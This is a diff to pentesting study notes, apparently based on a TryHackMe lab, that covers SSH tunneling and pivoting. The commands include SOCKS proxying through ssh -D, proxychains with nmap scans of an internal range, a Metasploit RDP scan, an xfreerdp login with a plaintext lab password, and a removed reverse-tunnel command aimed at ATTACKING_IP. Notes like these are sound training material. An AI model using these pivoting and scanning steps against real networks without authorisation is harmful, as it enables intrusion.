@@ -1,5 +1,51 @@
 # SSH Tunneling and Port Forwarding
 
+### SSH -D
+
+#### SOCKS Proxy Tunneling
+
+**Enable Dynamic Port Forwarding with SSH**
+
+```
+ssh -D 9050 ubuntu@10.129.202.64
+```
+
+**Edit /etc/proxychains.conf with Port to Use**
+
+```
+socks4 127.0.0.1 9050
+```
+
+**Scan Remote Network from Target Machine Over SSH Tunnel**
+
+```
+proxychains nmap -v -sn 172.16.5.1-200
+```
+
+* Only a full TCP connect scan works over proxychains
+* Windows may not respond to a normal ping as well so use -Pn
+
+```
+proxychains nmap -v -Pn -sT 172.16.5.19
+```
+
+#### Metasploit with Proxychains
+
+```
+proxychains msfconsole
+set LHOST eth0
+search rdp_scanner
+use 0
+set rhosts 172.16.5.19
+run
+```
+
+#### xfreerdp with Proxychains
+
+```
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+
 ### Forward Connections
 
 * Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.
@@ -67,26 +113,7 @@ ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
 
 * This would open up a port forward to our Kali box, allowing us to access the `172.16.0.10` webserver, in exactly the same way as with the forward connection we made before!
 
-#### Note
-
-* In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections).
-* This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
-
-```
-ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
-```
-
-* To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection:
-*
-
-    <figure><img src="https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png" alt=""><figcaption></figcaption></figure>
-* Find the process ID (PID) of the connection. In the above image this is 105238.
-* Finally, type sudo kill PID to close the connection:
-*
-
-    <figure><img src="https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png" alt=""><figcaption></figcaption></figure>
-
-#### Examples
+### Examples
 
 * If you wanted to set up a reverse portforward from port `22` of a remote machine (`172.16.0.100`) to port `2222` of your local machine (`172.16.0.200`), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
 
